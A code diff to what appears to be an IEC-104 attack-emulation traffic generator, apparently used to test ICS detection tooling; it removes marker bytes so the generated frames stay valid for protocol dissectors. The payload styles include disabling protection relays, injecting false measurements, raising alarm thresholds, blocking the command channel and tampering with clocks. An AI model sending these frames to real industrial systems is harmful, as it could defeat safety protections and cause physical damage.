@@ -4,7 +4,6 @@ import random
 import struct
 import time as _time_mod
 
-from .common import marker_bytes
 
 # IEC-104 ASDU Type IDs
 TYPE = {
@@ -110,67 +109,80 @@ def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
     _iec104_seq: int | None = (int(kwargs.get("iec104_seq")) & 0x7FFF) if kwargs.get("iec104_seq") is not None else None
     ca   = int(kwargs.get("ca",  rnd.randint(1, 10))) & 0xFFFF
     ioa  = int(kwargs.get("ioa", rnd.randint(1, 100)))
-    mb   = marker_bytes(marker)
 
     if style == "startdt":
-        return _apci_u("startdt_act") + mb
+        # U-format APCI frame. Per IEC 60870-5-104 §5.1, U-format frames
+        # are fixed 6 bytes with no application data. Appending the marker
+        # breaks TCP-stream parsing for downstream dissectors (Wireshark
+        # shows "ERR prefix N bytes" for every subsequent APCI). The trade-
+        # off is losing per-packet marker correlation on U-format control
+        # frames, which carry no app data anyway.
+        return _apci_u("startdt_act")
 
     if style == "stopdt":
-        return _apci_u("stopdt_act") + mb
+        return _apci_u("stopdt_act")
 
     if style == "testfr":
-        return _apci_u("testfr_act") + mb
+        return _apci_u("testfr_act")
 
+    # IEC-104 I-format frames: marker is OMITTED to preserve APCI length
+    # integrity. Per IEC 60870-5-101/104, the ASDU length is derived from
+    # type ID + element count; appending arbitrary bytes after the IOA
+    # elements makes the ASDU invalid per spec (Wireshark/Zeek/Malcolm
+    # dissectors all flag "Invalid Apdulen"). Run correlation for IEC-104
+    # remains available via the JSONL events file (run_id, technique,
+    # step). A follow-up may add marker delivery as additional synthetic
+    # IOA elements, but that requires per-type IOA encoders.
     if style == "meas_sp":
         # Single-point: SIQ = 0x01 (ON, valid)
-        data = b"\x01" + mb
+        data = b"\x01"
         asdu = _asdu(TYPE["meas_sp"], COT["spontaneous"], ca, ioa, data)
 
     elif style == "meas_mv":
         # Short float measurement
         val  = struct.pack("<f", rnd.uniform(0.0, 100.0))
-        data = val + b"\x00" + mb  # quality = 0 (valid)
+        data = val + b"\x00"  # quality = 0 (valid)
         asdu = _asdu(TYPE["meas_mv"], COT["periodic"], ca, ioa, data)
 
     elif style == "single_command":
         # SCO: SE=0 (execute), QU=0 (no add def), SCS=1 (ON)
         sco  = bytes([0x01])  # SCS=1
-        data = sco + mb
+        data = sco
         asdu = _asdu(TYPE["single_command"], COT["activation"], ca, ioa, data)
 
     elif style == "double_command":
         # DCO: SE=0, QU=0, DCS=2 (ON)
         dco  = bytes([0x02])
-        data = dco + mb
+        data = dco
         asdu = _asdu(TYPE["double_command"], COT["activation"], ca, ioa, data)
 
     elif style == "setpoint_float":
         # Short float setpoint
         val  = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
         qos  = b"\x00"  # QL=0 default
-        data = val + qos + mb
+        data = val + qos
         asdu = _asdu(TYPE["setpoint_float"], COT["activation"], ca, ioa, data)
 
     elif style == "setpoint_scale":
         # Scaled value setpoint (2 bytes)
         val  = struct.pack("<h", int(kwargs.get("value", rnd.randint(-32768, 32767))))
         qos  = b"\x00"
-        data = val + qos + mb
+        data = val + qos
         asdu = _asdu(TYPE["setpoint_scale"], COT["activation"], ca, ioa, data)
 
     elif style == "regulating_step":
         # Regulating step: RCS=0x02 (NEXT_HIGHER), SE=0
         rcs  = bytes([0x02])
-        data = rcs + mb
+        data = rcs
         asdu = _asdu(TYPE["regulating_step"], COT["activation"], ca, ioa, data)
 
     elif style == "interrogation":
         # Global interrogation QOI=20
-        data = bytes([0x14]) + mb  # QOI = 20 = global
+        data = bytes([0x14])  # QOI = 20 = global
         asdu = _asdu(TYPE["interrogation"], COT["activation"], ca, 0, data)
 
     elif style == "counter_interr":
-        data = bytes([0x05]) + mb  # QCC group 5
+        data = bytes([0x05])  # QCC group 5
         asdu = _asdu(TYPE["counter_interr"], COT["activation"], ca, 0, data)
 
     elif style == "clock_sync":
@@ -185,23 +197,23 @@ def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
             _now.month & 0x0F,                      # month (1-12)
             _now.year % 100,                        # year (0-99)
         )
-        data = t7 + mb
+        data = t7
         asdu = _asdu(TYPE["clock_sync"], COT["activation"], ca, 0, data)
 
     elif style == "reset_process":
         # QRP = 1 (general reset of process)
-        data = bytes([0x01]) + mb
+        data = bytes([0x01])
         asdu = _asdu(TYPE["reset_process"], COT["activation"], ca, 0, data)
 
     elif style == "test_command":
-        data = struct.pack(">H", rnd.randint(0, 0xFFFF)) + mb
+        data = struct.pack(">H", rnd.randint(0, 0xFFFF))
         asdu = _asdu(TYPE["test_command"], COT["activation"], ca, 0, data)
 
     elif style == "param_mv":
         # Normalized parameter write
         val  = struct.pack("<h", int(kwargs.get("value", rnd.randint(-32768, 32767))))
         qpm  = bytes([0x00])  # QPM = default
-        data = val + qpm + mb
+        data = val + qpm
         asdu = _asdu(TYPE["param_mv"], COT["activation"], ca, ioa, data)
 
     elif style in ("param_activ", "inhibit_alarm"):
@@ -209,7 +221,7 @@ def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
         # COT deactivation = inhibit spontaneous reporting
         cot_actual = COT["deactivation"] if style == "inhibit_alarm" else COT["activation"]
         qpa  = bytes([0x03])  # QPA = act/deact of persistent cyclic/per trans
-        data = qpa + mb
+        data = qpa
         asdu = _asdu(TYPE["param_activ"], cot_actual, ca, ioa, data)
 
     elif style == "param_threshold":
@@ -217,14 +229,14 @@ def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
         # Set measurement limit to extreme value so alarm never triggers
         val  = struct.pack("<h", 0x7FFF)  # max scaled value = alarm threshold raised to max
         qpm  = bytes([0x00])
-        data = val + qpm + mb
+        data = val + qpm
         asdu = _asdu(TYPE["param_mv"], COT["activation"], ca, ioa, data)
 
     elif style == "counter_reset":
         # C_CI_NA_1 with reset qualifier — T0872 Indicator Removal (clear event log)
         # QCC bit 6 set = freeze + reset
         qcc  = bytes([0x45])  # group 5 counter + freeze + reset
-        data = qcc + mb
+        data = qcc
         asdu = _asdu(TYPE["counter_interr"], COT["activation"], ca, ioa, data)
 
     elif style == "meas_inject":
@@ -232,34 +244,36 @@ def build_payload(marker: str, style: str = "meas_sp", **kwargs) -> bytes:
         # Attacker sends fake measurement values upstream toward SCADA
         val  = struct.pack("<f", float(kwargs.get("value", rnd.uniform(10.0, 100.0))))
         qds  = bytes([0x00])  # QDS = good quality
-        data = val + qds + mb
+        data = val + qds
         asdu = _asdu(TYPE["meas_mv"], COT["spontaneous"], ca, ioa, data)
 
     elif style == "protection_cmd":
         # C_SC_NA_1 to protection relay IOA range — T0837 Loss of Protection
         # Sends "deactivate protection" command to relay IOA
         sco  = bytes([0x00])  # SCO = off (deactivate)
-        data = sco + mb
+        data = sco
         asdu = _asdu(TYPE["single_command"], COT["deactivation"], ca, ioa, data)
 
     elif style == "block_cmd":
-        # Stopdt to block command channel — T0803 Block Command Message
-        return _apci_u("stopdt_act") + mb
+        # U-format STOPDT — blocks command channel (T0803 Block Command Message).
+        # U-format frames carry no app data; marker omitted for dissector safety.
+        return _apci_u("stopdt_act")
 
     elif style == "clock_inject":
         # C_CS_NA_1 with wrong timestamp — T0849 Masquerading (clock manipulation)
         ts = int(_time_mod.time() * 1000) & 0xFFFFFFFFFFFF
         cp56 = ts.to_bytes(7, "little")
-        data = cp56 + mb
+        data = cp56
         asdu = _asdu(TYPE["clock_sync"], COT["activation"], ca, 0, data)
 
     elif style == "available":
-        # U-format STARTDT — T0800 Activate Firmware Update Mode (observed as STARTDT to FW service port)
-        return _apci_u("startdt_act") + mb
+        # U-format STARTDT — T0800 Activate Firmware Update Mode.
+        # U-format frames carry no app data; marker omitted for dissector safety.
+        return _apci_u("startdt_act")
 
     else:
         # fallback: single-point measurement
-        data = b"\x01" + mb
+        data = b"\x01"
         asdu = _asdu(TYPE["meas_sp"], COT["spontaneous"], ca, ioa, data)
 
     seq  = _iec104_seq if _iec104_seq is not None else rnd.randint(0, 0x7FFF)
